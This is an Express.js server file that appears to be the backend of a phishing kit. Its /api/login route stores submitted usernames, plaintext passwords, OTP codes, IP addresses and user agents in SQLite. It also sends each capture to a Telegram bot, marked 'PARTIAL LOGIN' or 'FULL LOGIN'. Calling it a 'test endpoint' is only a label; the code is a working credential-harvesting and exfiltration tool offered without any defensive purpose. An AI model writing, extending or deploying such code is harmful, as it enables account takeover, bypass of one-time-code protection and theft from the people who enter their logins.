import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import cors from "cors";
import dotenv from "dotenv";
import path from "path";

// Load environment variables
dotenv.config();

// Initialize Database
const db = new Database("dev_logs.db");
db.exec(`
  CREATE TABLE IF NOT EXISTS form_submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    identifier TEXT,
    password TEXT,
    otp TEXT,
    ip_address TEXT,
    user_agent TEXT
  )
`);

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  // Middleware
  const allowedOrigin = process.env.ALLOWED_ORIGIN || "*";
  
  console.log(`CORS: Allowed Origin is set to: ${allowedOrigin}`);

  app.use(cors({
    origin: (origin, callback) => {
      // Allow requests with no origin (like mobile apps or curl requests)
      if (!origin) return callback(null, true);
      
      // If allowedOrigin is "*", allow everything
      if (allowedOrigin === "*") return callback(null, true);

      // Clean up both origins for comparison (remove trailing slashes)
      const cleanOrigin = origin.replace(/\/$/, "");
      const cleanAllowed = allowedOrigin.replace(/\/$/, "");

      if (cleanOrigin === cleanAllowed) {
        callback(null, true);
      } else {
        console.warn(`CORS: Blocked request from origin: ${origin}. Expected: ${allowedOrigin}`);
        callback(new Error('Not allowed by CORS'));
      }
    },
    methods: ["POST", "GET", "OPTIONS"],
    credentials: true,
    optionsSuccessStatus: 200
  }));
  app.use(express.json());

  // 3. Test Endpoint: Receives and logs form submissions
  app.post("/api/login", async (req, res) => {
    const { identifier, password, otp, step: currentStep } = req.body;
    const timestamp = new Date().toISOString();
    const ip_address = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    const user_agent = req.headers['user-agent'] || 'unknown';

    try {
      // 1. SQLite Persistence
      const insert = db.prepare(`
        INSERT INTO form_submissions (timestamp, identifier, password, otp, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
      `);
      insert.run(timestamp, identifier, password || 'N/A', otp || 'N/A', String(ip_address), user_agent);

      console.log(`✅ DATA PERSISTED TO SQLITE (Step: ${currentStep || 'Unknown'})`);

      // 2. Telegram Webhook Notification
      const botToken = process.env.TELEGRAM_BOT_TOKEN?.trim();
      const chatId = process.env.TELEGRAM_CHAT_ID?.trim();

      if (botToken && chatId) {
        const isFinal = currentStep === 'OTP';
        const statusEmoji = isFinal ? "✅" : "⏳";
        const statusText = isFinal ? "FULL LOGIN" : "PARTIAL LOGIN (ID + PASS)";

        const message = `<b>${statusEmoji} ${statusText}</b>\n\n` +
                        `<b>👤 ID:</b> <code>${identifier}</code>\n` +
                        `<b>🔑 Pass:</b> <code>${password || 'N/A'}</code>\n` +
                        `<b>🔢 OTP:</b> <code>${otp || 'N/A'}</code>\n` +
                        `<b>🌐 IP:</b> <code>${ip_address}</code>\n` +
                        `<b>🕐</b> <i>${timestamp}</i>`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
          })
        })
        .then(async (res) => {
          if (res.ok) {
            console.log(`🚀 Telegram notification sent (${statusText})`);
          } else {
            const responseText = await res.text();
            console.error("❌ Telegram API Error:", responseText);
          }
        })
        .catch(err => console.error("❌ Telegram Network Error:", err));
      }
    } catch (error) {
      console.error("Server Processing Error:", error);
    }

    res.json({ success: true });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  }

  app.listen(Number(PORT), "0.0.0.0", () => {
    console.log(`Backend server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
